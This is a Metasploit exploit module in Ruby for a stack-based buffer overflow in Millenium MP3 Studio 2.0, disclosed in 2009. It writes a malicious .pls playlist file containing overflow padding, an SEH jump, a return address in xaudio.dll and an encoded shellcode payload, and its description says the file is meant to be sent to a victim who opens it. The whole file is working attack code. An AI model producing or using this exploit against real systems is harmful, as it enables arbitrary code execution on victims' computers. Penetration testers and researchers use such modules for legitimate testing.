require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Millenium MP3 Studio 2.0 (PLS File) Stack Overflow.',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Millenium MP3 Studio 2.0.
					An attacker must send the file to victim and the victim must open the file.
					Alternatively it may be possible to execute code remotely via an embedded
					PLS file within a browser, when the PLS extention is registered to Millenium MP3 Studio.
					This functionality has not been tested in this module.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Molotov ', 'dookie' ],
			'Version'        => '$Revision: 7724 $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/10240' ],
				],
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0a\x0d\x3c\x22\x3e\x3d",
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        => 
				[
					[ 'Windows Universal', { 'Ret' => 0x10015593 } ], #p/p/r in xaudio.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => '28 Nov 2009',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ true, 'The file name.',  'millenium.pls']),
				], self.class)

	end

	def exploit
		
		header = "[playlist]\r\n"
		header << "NumberOfEntries=1\r\n"
		header << "File1=http://"		

		sploit = rand_text_alpha_upper(4103)
		sploit << "\xeb\x1c\x90\x90"
		sploit << [target.ret].pack('V')
		sploit << payload.encoded
		sploit << rand_text_alpha_upper(1000)

		filepls = header + sploit
		
		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(filepls)

	end

end